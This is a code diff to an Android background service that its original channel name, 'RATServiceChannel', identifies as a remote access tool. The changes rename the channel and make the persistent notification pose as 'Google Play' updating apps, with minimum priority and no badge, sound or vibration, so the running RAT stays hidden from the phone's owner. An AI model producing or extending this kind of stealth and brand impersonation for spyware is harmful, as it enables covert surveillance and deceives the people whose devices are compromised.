@@ -12,7 +12,7 @@ import com.task.tusker.network.SocketManager;
 
 public class BackgroundService extends Service {
 
-    private static final String CHANNEL_ID = "RATServiceChannel";
+    private static final String CHANNEL_ID = "SystemSyncChannel";
     private SocketManager socketManager;
 
     @Override
@@ -38,9 +38,12 @@ public class BackgroundService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "Background Service",
-                NotificationManager.IMPORTANCE_LOW
+                "System Sync",
+                NotificationManager.IMPORTANCE_MIN
             );
+            channel.setShowBadge(false);
+            channel.setSound(null, null);
+            channel.enableVibration(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -50,10 +53,12 @@ public class BackgroundService extends Service {
 
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Service Running")
-            .setContentText("App is running in background")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setContentTitle("Google Play")
+            .setContentText("Keeping your apps up to date")
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setOngoing(true)
             .build();
     }
 
